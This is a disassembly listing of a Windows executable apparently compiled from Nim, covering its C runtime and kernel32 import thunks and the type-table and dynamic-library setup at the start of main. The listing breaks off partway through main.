0000000000408400 <fwrite>:
  408400:	ff 25 16 00 04 00    	jmp    *0x40016(%rip)        # 44841c <__imp_fwrite>
  408406:	90                   	nop
  408407:	90                   	nop

0000000000408408 <free>:
  408408:	ff 25 06 00 04 00    	jmp    *0x40006(%rip)        # 448414 <__imp_free>
  40840e:	90                   	nop
  40840f:	90                   	nop

0000000000408410 <fprintf>:
  408410:	ff 25 ee ff 03 00    	jmp    *0x3ffee(%rip)        # 448404 <__imp_fprintf>
  408416:	90                   	nop
  408417:	90                   	nop

0000000000408418 <fflush>:
  408418:	ff 25 de ff 03 00    	jmp    *0x3ffde(%rip)        # 4483fc <__imp_fflush>
  40841e:	90                   	nop
  40841f:	90                   	nop

0000000000408420 <exit>:
  408420:	ff 25 ce ff 03 00    	jmp    *0x3ffce(%rip)        # 4483f4 <__imp_exit>
  408426:	90                   	nop
  408427:	90                   	nop

0000000000408428 <calloc>:
  408428:	ff 25 be ff 03 00    	jmp    *0x3ffbe(%rip)        # 4483ec <__imp_calloc>
  40842e:	90                   	nop
  40842f:	90                   	nop

0000000000408430 <abort>:
  408430:	ff 25 ae ff 03 00    	jmp    *0x3ffae(%rip)        # 4483e4 <__imp_abort>
  408436:	90                   	nop
  408437:	90                   	nop

0000000000408438 <_setmode>:
  408438:	ff 25 9e ff 03 00    	jmp    *0x3ff9e(%rip)        # 4483dc <__imp__setmode>
  40843e:	90                   	nop
  40843f:	90                   	nop

0000000000408440 <_setjmp>:
  408440:	ff 25 8e ff 03 00    	jmp    *0x3ff8e(%rip)        # 4483d4 <__imp__setjmp>
  408446:	90                   	nop
  408447:	90                   	nop

0000000000408448 <_onexit>:
  408448:	ff 25 7e ff 03 00    	jmp    *0x3ff7e(%rip)        # 4483cc <__imp__onexit>
  40844e:	90                   	nop
  40844f:	90                   	nop

0000000000408450 <_initterm>:
  408450:	ff 25 6e ff 03 00    	jmp    *0x3ff6e(%rip)        # 4483c4 <__imp__initterm>
  408456:	90                   	nop
  408457:	90                   	nop

0000000000408458 <_fileno>:
  408458:	ff 25 56 ff 03 00    	jmp    *0x3ff56(%rip)        # 4483b4 <__imp__fileno>
  40845e:	90                   	nop
  40845f:	90                   	nop

0000000000408460 <_cexit>:
  408460:	ff 25 46 ff 03 00    	jmp    *0x3ff46(%rip)        # 4483ac <__imp__cexit>
  408466:	90                   	nop
  408467:	90                   	nop

0000000000408468 <_amsg_exit>:
  408468:	ff 25 36 ff 03 00    	jmp    *0x3ff36(%rip)        # 4483a4 <__imp__amsg_exit>
  40846e:	90                   	nop
  40846f:	90                   	nop

0000000000408470 <__setusermatherr>:
  408470:	ff 25 1e ff 03 00    	jmp    *0x3ff1e(%rip)        # 448394 <__imp___setusermatherr>
  408476:	90                   	nop
  408477:	90                   	nop

0000000000408478 <__set_app_type>:
  408478:	ff 25 0e ff 03 00    	jmp    *0x3ff0e(%rip)        # 44838c <__imp___set_app_type>
  40847e:	90                   	nop
  40847f:	90                   	nop

0000000000408480 <__lconv_init>:
  408480:	ff 25 fe fe 03 00    	jmp    *0x3fefe(%rip)        # 448384 <__imp___lconv_init>
  408486:	90                   	nop
  408487:	90                   	nop

0000000000408488 <__getmainargs>:
  408488:	ff 25 de fe 03 00    	jmp    *0x3fede(%rip)        # 44836c <__imp___getmainargs>
  40848e:	90                   	nop
  40848f:	90                   	nop

0000000000408490 <__C_specific_handler>:
  408490:	ff 25 ce fe 03 00    	jmp    *0x3fece(%rip)        # 448364 <__imp___C_specific_handler>
  408496:	90                   	nop
  408497:	90                   	nop
  408498:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40849f:	00 

00000000004084a0 <__acrt_iob_func>:
  4084a0:	53                   	push   %rbx
  4084a1:	48 83 ec 20          	sub    $0x20,%rsp
  4084a5:	89 cb                	mov    %ecx,%ebx
  4084a7:	e8 54 00 00 00       	call   408500 <__iob_func>
  4084ac:	89 d9                	mov    %ebx,%ecx
  4084ae:	48 8d 14 49          	lea    (%rcx,%rcx,2),%rdx
  4084b2:	48 c1 e2 04          	shl    $0x4,%rdx
  4084b6:	48 01 d0             	add    %rdx,%rax
  4084b9:	48 83 c4 20          	add    $0x20,%rsp
  4084bd:	5b                   	pop    %rbx
  4084be:	c3                   	ret
  4084bf:	90                   	nop

00000000004084c0 <_get_invalid_parameter_handler>:
  4084c0:	48 8b 05 89 66 02 00 	mov    0x26689(%rip),%rax        # 42eb50 <handler>
  4084c7:	c3                   	ret
  4084c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4084cf:	00 

00000000004084d0 <_set_invalid_parameter_handler>:
  4084d0:	48 89 c8             	mov    %rcx,%rax
  4084d3:	48 87 05 76 66 02 00 	xchg   %rax,0x26676(%rip)        # 42eb50 <handler>
  4084da:	c3                   	ret
  4084db:	90                   	nop
  4084dc:	90                   	nop
  4084dd:	90                   	nop
  4084de:	90                   	nop
  4084df:	90                   	nop

00000000004084e0 <__p__acmdln>:
  4084e0:	48 8b 05 f9 97 00 00 	mov    0x97f9(%rip),%rax        # 411ce0 <.refptr.__imp__acmdln>
  4084e7:	48 8b 00             	mov    (%rax),%rax
  4084ea:	c3                   	ret
  4084eb:	90                   	nop
  4084ec:	90                   	nop
  4084ed:	90                   	nop
  4084ee:	90                   	nop
  4084ef:	90                   	nop

00000000004084f0 <__p__fmode>:
  4084f0:	48 8b 05 f9 97 00 00 	mov    0x97f9(%rip),%rax        # 411cf0 <.refptr.__imp__fmode>
  4084f7:	48 8b 00             	mov    (%rax),%rax
  4084fa:	c3                   	ret
  4084fb:	90                   	nop
  4084fc:	90                   	nop
  4084fd:	90                   	nop
  4084fe:	90                   	nop
  4084ff:	90                   	nop

0000000000408500 <__iob_func>:
  408500:	ff 25 76 fe 03 00    	jmp    *0x3fe76(%rip)        # 44837c <__imp___iob_func>
  408506:	90                   	nop
  408507:	90                   	nop
  408508:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40850f:	00 

0000000000408510 <VirtualQuery>:
  408510:	ff 25 3e fe 03 00    	jmp    *0x3fe3e(%rip)        # 448354 <__imp_VirtualQuery>
  408516:	90                   	nop
  408517:	90                   	nop

0000000000408518 <VirtualProtect>:
  408518:	ff 25 2e fe 03 00    	jmp    *0x3fe2e(%rip)        # 44834c <__imp_VirtualProtect>
  40851e:	90                   	nop
  40851f:	90                   	nop

0000000000408520 <VirtualFree>:
  408520:	ff 25 1e fe 03 00    	jmp    *0x3fe1e(%rip)        # 448344 <__imp_VirtualFree>
  408526:	90                   	nop
  408527:	90                   	nop

0000000000408528 <VirtualAlloc>:
  408528:	ff 25 0e fe 03 00    	jmp    *0x3fe0e(%rip)        # 44833c <__imp_VirtualAlloc>
  40852e:	90                   	nop
  40852f:	90                   	nop

0000000000408530 <UnhandledExceptionFilter>:
  408530:	ff 25 fe fd 03 00    	jmp    *0x3fdfe(%rip)        # 448334 <__imp_UnhandledExceptionFilter>
  408536:	90                   	nop
  408537:	90                   	nop

0000000000408538 <TryEnterCriticalSection>:
  408538:	ff 25 ee fd 03 00    	jmp    *0x3fdee(%rip)        # 44832c <__imp_TryEnterCriticalSection>
  40853e:	90                   	nop
  40853f:	90                   	nop

0000000000408540 <TlsSetValue>:
  408540:	ff 25 de fd 03 00    	jmp    *0x3fdde(%rip)        # 448324 <__imp_TlsSetValue>
  408546:	90                   	nop
  408547:	90                   	nop

0000000000408548 <TlsGetValue>:
  408548:	ff 25 ce fd 03 00    	jmp    *0x3fdce(%rip)        # 44831c <__imp_TlsGetValue>
  40854e:	90                   	nop
  40854f:	90                   	nop

0000000000408550 <TlsAlloc>:
  408550:	ff 25 be fd 03 00    	jmp    *0x3fdbe(%rip)        # 448314 <__imp_TlsAlloc>
  408556:	90                   	nop
  408557:	90                   	nop

0000000000408558 <TerminateProcess>:
  408558:	ff 25 ae fd 03 00    	jmp    *0x3fdae(%rip)        # 44830c <__imp_TerminateProcess>
  40855e:	90                   	nop
  40855f:	90                   	nop

0000000000408560 <Sleep>:
  408560:	ff 25 9e fd 03 00    	jmp    *0x3fd9e(%rip)        # 448304 <__imp_Sleep>
  408566:	90                   	nop
  408567:	90                   	nop

0000000000408568 <SetUnhandledExceptionFilter>:
  408568:	ff 25 8e fd 03 00    	jmp    *0x3fd8e(%rip)        # 4482fc <__imp_SetUnhandledExceptionFilter>
  40856e:	90                   	nop
  40856f:	90                   	nop

0000000000408570 <SetLastError>:
  408570:	ff 25 7e fd 03 00    	jmp    *0x3fd7e(%rip)        # 4482f4 <__imp_SetLastError>
  408576:	90                   	nop
  408577:	90                   	nop

0000000000408578 <RtlVirtualUnwind>:
  408578:	ff 25 6e fd 03 00    	jmp    *0x3fd6e(%rip)        # 4482ec <__imp_RtlVirtualUnwind>
  40857e:	90                   	nop
  40857f:	90                   	nop

0000000000408580 <RtlLookupFunctionEntry>:
  408580:	ff 25 5e fd 03 00    	jmp    *0x3fd5e(%rip)        # 4482e4 <__imp_RtlLookupFunctionEntry>
  408586:	90                   	nop
  408587:	90                   	nop

0000000000408588 <RtlCaptureContext>:
  408588:	ff 25 4e fd 03 00    	jmp    *0x3fd4e(%rip)        # 4482dc <__imp_RtlCaptureContext>
  40858e:	90                   	nop
  40858f:	90                   	nop

0000000000408590 <RtlAddFunctionTable>:
  408590:	ff 25 3e fd 03 00    	jmp    *0x3fd3e(%rip)        # 4482d4 <__imp_RtlAddFunctionTable>
  408596:	90                   	nop
  408597:	90                   	nop

0000000000408598 <QueryPerformanceCounter>:
  408598:	ff 25 2e fd 03 00    	jmp    *0x3fd2e(%rip)        # 4482cc <__imp_QueryPerformanceCounter>
  40859e:	90                   	nop
  40859f:	90                   	nop

00000000004085a0 <LoadLibraryA>:
  4085a0:	ff 25 1e fd 03 00    	jmp    *0x3fd1e(%rip)        # 4482c4 <__imp_LoadLibraryA>
  4085a6:	90                   	nop
  4085a7:	90                   	nop

00000000004085a8 <LeaveCriticalSection>:
  4085a8:	ff 25 0e fd 03 00    	jmp    *0x3fd0e(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  4085ae:	90                   	nop
  4085af:	90                   	nop

00000000004085b0 <InitializeCriticalSection>:
  4085b0:	ff 25 fe fc 03 00    	jmp    *0x3fcfe(%rip)        # 4482b4 <__imp_InitializeCriticalSection>
  4085b6:	90                   	nop
  4085b7:	90                   	nop

00000000004085b8 <GetTickCount>:
  4085b8:	ff 25 ee fc 03 00    	jmp    *0x3fcee(%rip)        # 4482ac <__imp_GetTickCount>
  4085be:	90                   	nop
  4085bf:	90                   	nop

00000000004085c0 <GetSystemTimeAsFileTime>:
  4085c0:	ff 25 de fc 03 00    	jmp    *0x3fcde(%rip)        # 4482a4 <__imp_GetSystemTimeAsFileTime>
  4085c6:	90                   	nop
  4085c7:	90                   	nop

00000000004085c8 <GetStartupInfoA>:
  4085c8:	ff 25 ce fc 03 00    	jmp    *0x3fcce(%rip)        # 44829c <__imp_GetStartupInfoA>
  4085ce:	90                   	nop
  4085cf:	90                   	nop

00000000004085d0 <GetProcAddress>:
  4085d0:	ff 25 be fc 03 00    	jmp    *0x3fcbe(%rip)        # 448294 <__imp_GetProcAddress>
  4085d6:	90                   	nop
  4085d7:	90                   	nop

00000000004085d8 <GetLastError>:
  4085d8:	ff 25 ae fc 03 00    	jmp    *0x3fcae(%rip)        # 44828c <__imp_GetLastError>
  4085de:	90                   	nop
  4085df:	90                   	nop

00000000004085e0 <GetCurrentThreadId>:
  4085e0:	ff 25 9e fc 03 00    	jmp    *0x3fc9e(%rip)        # 448284 <__imp_GetCurrentThreadId>
  4085e6:	90                   	nop
  4085e7:	90                   	nop

00000000004085e8 <GetCurrentProcessId>:
  4085e8:	ff 25 8e fc 03 00    	jmp    *0x3fc8e(%rip)        # 44827c <__imp_GetCurrentProcessId>
  4085ee:	90                   	nop
  4085ef:	90                   	nop

00000000004085f0 <GetCurrentProcess>:
  4085f0:	ff 25 7e fc 03 00    	jmp    *0x3fc7e(%rip)        # 448274 <__imp_GetCurrentProcess>
  4085f6:	90                   	nop
  4085f7:	90                   	nop

00000000004085f8 <EnterCriticalSection>:
  4085f8:	ff 25 6e fc 03 00    	jmp    *0x3fc6e(%rip)        # 44826c <__imp_EnterCriticalSection>
  4085fe:	90                   	nop
  4085ff:	90                   	nop

0000000000408600 <DeleteCriticalSection>:
  408600:	ff 25 5e fc 03 00    	jmp    *0x3fc5e(%rip)        # 448264 <__IAT_start__>
  408606:	90                   	nop
  408607:	90                   	nop
  408608:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40860f:	00 

0000000000408610 <printf>:
  408610:	ff 25 3e fe 03 00    	jmp    *0x3fe3e(%rip)        # 448454 <__imp_printf>
  408616:	90                   	nop
  408617:	90                   	nop

0000000000408618 <memcmp>:
  408618:	ff 25 26 fe 03 00    	jmp    *0x3fe26(%rip)        # 448444 <__imp_memcmp>
  40861e:	90                   	nop
  40861f:	90                   	nop

0000000000408620 <memchr>:
  408620:	ff 25 16 fe 03 00    	jmp    *0x3fe16(%rip)        # 44843c <__imp_memchr>
  408626:	90                   	nop
  408627:	90                   	nop

0000000000408628 <fputc>:
  408628:	ff 25 de fd 03 00    	jmp    *0x3fdde(%rip)        # 44840c <__imp_fputc>
  40862e:	90                   	nop
  40862f:	90                   	nop

0000000000408630 <main>:
  408630:	41 57                	push   %r15
  408632:	41 56                	push   %r14
  408634:	41 55                	push   %r13
  408636:	41 54                	push   %r12
  408638:	55                   	push   %rbp
  408639:	57                   	push   %rdi
  40863a:	56                   	push   %rsi
  40863b:	53                   	push   %rbx
  40863c:	48 83 ec 38          	sub    $0x38,%rsp
  408640:	e8 5b e9 ff ff       	call   406fa0 <__main>
  408645:	48 8d 05 b9 cd ff ff 	lea    -0x3247(%rip),%rax        # 405405 <PreMainInner>
  40864c:	48 c7 05 49 ca 01 00 	movq   $0x2,0x1ca49(%rip)        # 4250a0 <NTI__Tyd4y3haUOOHTj71TPIRag_>
  408653:	02 00 00 00 
  408657:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  40865c:	48 8d 05 dd cc 01 00 	lea    0x1ccdd(%rip),%rax        # 425340 <NTI__kDPg4wXyR8DDyA0MeEjIsw_>
  408663:	48 89 05 46 ca 01 00 	mov    %rax,0x1ca46(%rip)        # 4250b0 <NTI__Tyd4y3haUOOHTj71TPIRag_+0x10>
  40866a:	48 8d 05 2f ca 01 00 	lea    0x1ca2f(%rip),%rax        # 4250a0 <NTI__Tyd4y3haUOOHTj71TPIRag_>
  408671:	48 89 05 f8 c9 01 00 	mov    %rax,0x1c9f8(%rip)        # 425070 <NTI__4HwedE75WPfqZSQ0Cq2OUg_+0x10>
  408678:	48 8d 0d 01 90 00 00 	lea    0x9001(%rip),%rcx        # 411680 <TM__MnCJ0VAmeZ9aTATUB39cx60Q_4>
  40867f:	66 c7 05 20 ca 01 00 	movw   $0x331,0x1ca20(%rip)        # 4250a8 <NTI__Tyd4y3haUOOHTj71TPIRag_+0x8>
  408686:	31 03 
  408688:	48 8d 05 c1 8e ff ff 	lea    -0x713f(%rip),%rax        # 401550 <Marker_tyRef__4HwedE75WPfqZSQ0Cq2OUg>
  40868f:	48 c7 05 c6 c9 01 00 	movq   $0x8,0x1c9c6(%rip)        # 425060 <NTI__4HwedE75WPfqZSQ0Cq2OUg_>
  408696:	08 00 00 00 
  40869a:	66 c7 05 c5 c9 01 00 	movw   $0x216,0x1c9c5(%rip)        # 425068 <NTI__4HwedE75WPfqZSQ0Cq2OUg_+0x8>
  4086a1:	16 02 
  4086a3:	48 89 05 de c9 01 00 	mov    %rax,0x1c9de(%rip)        # 425088 <NTI__4HwedE75WPfqZSQ0Cq2OUg_+0x28>
  4086aa:	e8 fc 92 ff ff       	call   4019ab <nimLoadLibrary>
  4086af:	48 8d 0d aa 8f 00 00 	lea    0x8faa(%rip),%rcx        # 411660 <TM__MnCJ0VAmeZ9aTATUB39cx60Q_5>
  4086b6:	48 85 c0             	test   %rax,%rax
  4086b9:	48 89 05 28 ca 01 00 	mov    %rax,0x1ca28(%rip)        # 4250e8 <TM__MnCJ0VAmeZ9aTATUB39cx60Q_2>
  4086c0:	0f 84 72 0a 00 00    	je     409138 <main+0xb08>
  4086c6:	48 8d 15 c3 3b 00 00 	lea    0x3bc3(%rip),%rdx        # 40c290 <.rdata+0x290>
  4086cd:	48 89 c1             	mov    %rax,%rcx
  4086d0:	e8 9a 97 ff ff       	call   401e6f <nimGetProcAddr>
  4086d5:	48 8b 0d 0c ca 01 00 	mov    0x1ca0c(%rip),%rcx        # 4250e8 <TM__MnCJ0VAmeZ9aTATUB39cx60Q_2>
  4086dc:	48 8d 15 c0 3b 00 00 	lea    0x3bc0(%rip),%rdx        # 40c2a3 <.rdata+0x2a3>
  4086e3:	48 89 05 f6 c9 01 00 	mov    %rax,0x1c9f6(%rip)        # 4250e0 <Dl_4756003_>
  4086ea:	48 8d 35 bf 3b 00 00 	lea    0x3bbf(%rip),%rsi        # 40c2b0 <.rdata+0x2b0>
  4086f1:	48 8d 2d 28 25 02 00 	lea    0x22528(%rip),%rbp        # 42ac20 <NTI__ytyiCJqK439aF9cIibuRVpAg_>
  4086f8:	48 8d 1d b8 3b 00 00 	lea    0x3bb8(%rip),%rbx        # 40c2b7 <.rdata+0x2b7>
  4086ff:	e8 6b 97 ff ff       	call   401e6f <nimGetProcAddr>
  408704:	4c 8d 35 15 1c 02 00 	lea    0x21c15(%rip),%r14        # 42a320 <NTI__vr5DoT1jILTGdRlYv1OYpw_>
  40870b:	48 c7 05 ca 1a 02 00 	movq   $0x10,0x21aca(%rip)        # 42a1e0 <NTI__IIomJ6ptE6vfJ5zRbATgkQ_>
  408712:	10 00 00 00 
  408716:	48 89 05 bb c9 01 00 	mov    %rax,0x1c9bb(%rip)        # 4250d8 <Dl_4756006_>
  40871d:	48 8d 05 ac d0 01 00 	lea    0x1d0ac(%rip),%rax        # 4257d0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x30>
  408724:	48 89 05 e5 d5 01 00 	mov    %rax,0x1d5e5(%rip)        # 425d10 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_2_2.56585>
  40872b:	48 83 c0 30          	add    $0x30,%rax
  40872f:	48 89 05 e2 d5 01 00 	mov    %rax,0x1d5e2(%rip)        # 425d18 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_2_2.56585+0x8>
  408736:	48 83 c0 30          	add    $0x30,%rax
  40873a:	48 89 05 f7 24 02 00 	mov    %rax,0x224f7(%rip)        # 42ac38 <NTI__ytyiCJqK439aF9cIibuRVpAg_+0x18>
  408741:	48 83 c0 30          	add    $0x30,%rax
  408745:	48 89 05 2c d0 01 00 	mov    %rax,0x1d02c(%rip)        # 425778 <NTI__diB2NTuAIWY0FO9c5IUJRGg_+0x18>
  40874c:	48 8d 05 0d d0 01 00 	lea    0x1d00d(%rip),%rax        # 425760 <NTI__diB2NTuAIWY0FO9c5IUJRGg_>
  408753:	48 89 05 96 1b 02 00 	mov    %rax,0x21b96(%rip)        # 42a2f0 <NTI__HsJiUUcO9cHBdUCi0HwkSTA_+0x10>
  40875a:	48 8d 05 a3 8f ff ff 	lea    -0x705d(%rip),%rax        # 401704 <Marker_tyRef__HsJiUUcO9cHBdUCi0HwkSTA>
  408761:	48 89 05 a0 1b 02 00 	mov    %rax,0x21ba0(%rip)        # 42a308 <NTI__HsJiUUcO9cHBdUCi0HwkSTA_+0x28>
  408768:	4c 8d 2d 71 1b 02 00 	lea    0x21b71(%rip),%r13        # 42a2e0 <NTI__HsJiUUcO9cHBdUCi0HwkSTA_>
  40876f:	48 8d 05 9a d5 01 00 	lea    0x1d59a(%rip),%rax        # 425d10 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_2_2.56585>
  408776:	c6 05 6b 1a 02 00 12 	movb   $0x12,0x21a6b(%rip)        # 42a1e8 <NTI__IIomJ6ptE6vfJ5zRbATgkQ_+0x8>
  40877d:	66 c7 05 a2 1b 02 00 	movw   $0x31a,0x21ba2(%rip)        # 42a328 <NTI__vr5DoT1jILTGdRlYv1OYpw_+0x8>
  408784:	1a 03 
  408786:	48 8d 3d 38 3b 00 00 	lea    0x3b38(%rip),%rdi        # 40c2c5 <.rdata+0x2c5>
  40878d:	c6 05 3c d0 01 00 01 	movb   $0x1,0x1d03c(%rip)        # 4257d0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x30>
  408794:	48 8d 15 2f 3b 00 00 	lea    0x3b2f(%rip),%rdx        # 40c2ca <.rdata+0x2ca>
  40879b:	48 c7 05 4a 1a 02 00 	movq   $0x0,0x21a4a(%rip)        # 42a1f0 <NTI__IIomJ6ptE6vfJ5zRbATgkQ_+0x10>
  4087a2:	00 00 00 00 
  4087a6:	4c 8d 25 73 19 02 00 	lea    0x21973(%rip),%r12        # 42a120 <NTI__vU9aO9cTqOMn6CBzhV8rX7Sw_>
  4087ad:	4c 89 35 2c d0 01 00 	mov    %r14,0x1d02c(%rip)        # 4257e0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x40>
  4087b4:	4c 8d 3d a5 20 02 00 	lea    0x220a5(%rip),%r15        # 42a860 <NTI__rR5Bzr1D5krxoo1NcNyeMA_>
  4087bb:	48 89 35 26 d0 01 00 	mov    %rsi,0x1d026(%rip)        # 4257e8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x48>
  4087c2:	48 8d 0d 57 cf 01 00 	lea    0x1cf57(%rip),%rcx        # 425720 <NTI__XEycrCsme5C8CVWAYEcdBQ_>
  4087c9:	48 c7 05 5c 1b 02 00 	movq   $0x0,0x21b5c(%rip)        # 42a330 <NTI__vr5DoT1jILTGdRlYv1OYpw_+0x10>
  4087d0:	00 00 00 00 
  4087d4:	4c 8d 05 e5 d3 01 00 	lea    0x1d3e5(%rip),%r8        # 425bc0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x420>
  4087db:	48 c7 05 3a 1b 02 00 	movq   $0x8,0x21b3a(%rip)        # 42a320 <NTI__vr5DoT1jILTGdRlYv1OYpw_>
  4087e2:	08 00 00 00 
  4087e6:	4d 8d 48 30          	lea    0x30(%r8),%r9
  4087ea:	66 c7 05 35 24 02 00 	movw   $0x111,0x22435(%rip)        # 42ac28 <NTI__ytyiCJqK439aF9cIibuRVpAg_+0x8>
  4087f1:	11 01 
  4087f3:	4c 8d 15 c6 c9 01 00 	lea    0x1c9c6(%rip),%r10        # 4251c0 <NTI__t7nhKLvXTQS9cS8ByJU9bIag_>
  4087fa:	48 c7 05 d3 cf 01 00 	movq   $0x0,0x1cfd3(%rip)        # 4257d8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x38>
  408801:	00 00 00 00 
  408805:	4c 8d 1d a9 aa ff ff 	lea    -0x5557(%rip),%r11        # 4032b5 <Marker_tyRef__8SzoIAgLw9ci2v0yafHj9b6Q>
  40880c:	48 c7 05 19 24 02 00 	movq   $0x0,0x22419(%rip)        # 42ac30 <NTI__ytyiCJqK439aF9cIibuRVpAg_+0x10>
  408813:	00 00 00 00 
  408817:	48 c7 05 fe 23 02 00 	movq   $0x8,0x223fe(%rip)        # 42ac20 <NTI__ytyiCJqK439aF9cIibuRVpAg_>
  40881e:	08 00 00 00 
  408822:	48 c7 05 23 d0 01 00 	movq   $0x0,0x1d023(%rip)        # 425850 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0xb0>
  408829:	00 00 00 00 
  40882d:	c6 05 fc cf 01 00 02 	movb   $0x2,0x1cffc(%rip)        # 425830 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x90>
  408834:	48 89 2d 35 cf 01 00 	mov    %rbp,0x1cf35(%rip)        # 425770 <NTI__diB2NTuAIWY0FO9c5IUJRGg_+0x10>
  40883b:	48 c7 05 1a cf 01 00 	movq   $0x8,0x1cf1a(%rip)        # 425760 <NTI__diB2NTuAIWY0FO9c5IUJRGg_>
  408842:	08 00 00 00 
  408846:	66 c7 05 19 cf 01 00 	movw   $0x111,0x1cf19(%rip)        # 425768 <NTI__diB2NTuAIWY0FO9c5IUJRGg_+0x8>
  40884d:	11 01 
  40884f:	48 c7 05 26 d0 01 00 	movq   $0x0,0x1d026(%rip)        # 425880 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0xe0>
  408856:	00 00 00 00 
  40885a:	c6 05 ff cf 01 00 02 	movb   $0x2,0x1cfff(%rip)        # 425860 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0xc0>
  408861:	48 c7 05 74 1a 02 00 	movq   $0x8,0x21a74(%rip)        # 42a2e0 <NTI__HsJiUUcO9cHBdUCi0HwkSTA_>
  408868:	08 00 00 00 
  40886c:	c6 05 75 1a 02 00 16 	movb   $0x16,0x21a75(%rip)        # 42a2e8 <NTI__HsJiUUcO9cHBdUCi0HwkSTA_+0x8>
  408873:	c6 05 86 cf 01 00 01 	movb   $0x1,0x1cf86(%rip)        # 425800 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x60>
  40887a:	48 c7 05 83 cf 01 00 	movq   $0x8,0x1cf83(%rip)        # 425808 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x68>
  408881:	08 00 00 00 
  408885:	4c 89 2d 84 cf 01 00 	mov    %r13,0x1cf84(%rip)        # 425810 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x70>
  40888c:	48 89 1d 85 cf 01 00 	mov    %rbx,0x1cf85(%rip)        # 425818 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x78>
  408893:	48 89 05 2e cf 01 00 	mov    %rax,0x1cf2e(%rip)        # 4257c8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x28>
  40889a:	48 8d 05 ff ce 01 00 	lea    0x1ceff(%rip),%rax        # 4257a0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589>
  4088a1:	48 89 05 50 19 02 00 	mov    %rax,0x21950(%rip)        # 42a1f8 <NTI__IIomJ6ptE6vfJ5zRbATgkQ_+0x18>
  4088a8:	48 8d 05 31 19 02 00 	lea    0x21931(%rip),%rax        # 42a1e0 <NTI__IIomJ6ptE6vfJ5zRbATgkQ_>
  4088af:	48 89 05 9a 16 02 00 	mov    %rax,0x2169a(%rip)        # 429f50 <NTI__WF89a8QyKeDCh4DYWTmSiBg_+0x10>
  4088b6:	48 8d 05 43 a9 ff ff 	lea    -0x56bd(%rip),%rax        # 403200 <Marker_tySequence__WF89a8QyKeDCh4DYWTmSiBg>
  4088bd:	48 89 05 a4 16 02 00 	mov    %rax,0x216a4(%rip)        # 429f68 <NTI__WF89a8QyKeDCh4DYWTmSiBg_+0x28>
  4088c4:	48 8d 05 f5 cf 01 00 	lea    0x1cff5(%rip),%rax        # 4258c0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x120>
  4088cb:	48 89 05 0e ce 01 00 	mov    %rax,0x1ce0e(%rip)        # 4256e0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_4_5.56586>
  4088d2:	48 8d 05 e5 39 00 00 	lea    0x39e5(%rip),%rax        # 40c2be <.rdata+0x2be>
  4088d9:	48 89 05 f8 cf 01 00 	mov    %rax,0x1cff8(%rip)        # 4258d8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x138>
  4088e0:	48 8d 05 09 d0 01 00 	lea    0x1d009(%rip),%rax        # 4258f0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x150>
  4088e7:	48 89 3d 1a d0 01 00 	mov    %rdi,0x1d01a(%rip)        # 425908 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x168>
  4088ee:	48 8d 3d 2b d0 01 00 	lea    0x1d02b(%rip),%rdi        # 425920 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x180>
  4088f5:	48 89 05 ec cd 01 00 	mov    %rax,0x1cdec(%rip)        # 4256e8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_4_5.56586+0x8>
  4088fc:	48 8d 05 9d cd 01 00 	lea    0x1cd9d(%rip),%rax        # 4256a0 <NTI__S9agCYBinaYZnGWcjTdxclg_>
  408903:	48 89 3d e6 cd 01 00 	mov    %rdi,0x1cde6(%rip)        # 4256f0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_4_5.56586+0x10>
  40890a:	48 8d 3d ef 24 02 00 	lea    0x224ef(%rip),%rdi        # 42ae00 <NTI__77mFvmsOLKik79ci2hXkHEg_>
  408911:	48 89 15 20 d0 01 00 	mov    %rdx,0x1d020(%rip)        # 425938 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x198>
  408918:	48 8d 15 31 d0 01 00 	lea    0x1d031(%rip),%rdx        # 425950 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x1b0>
  40891f:	48 89 05 da cf 01 00 	mov    %rax,0x1cfda(%rip)        # 425900 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x160>
  408926:	48 c7 05 8f ce 01 00 	movq   $0x2,0x1ce8f(%rip)        # 4257c0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x20>
  40892d:	02 00 00 00 
  408931:	c6 05 68 ce 01 00 02 	movb   $0x2,0x1ce68(%rip)        # 4257a0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589>
  408938:	48 c7 05 fd 15 02 00 	movq   $0x8,0x215fd(%rip)        # 429f40 <NTI__WF89a8QyKeDCh4DYWTmSiBg_>
  40893f:	08 00 00 00 
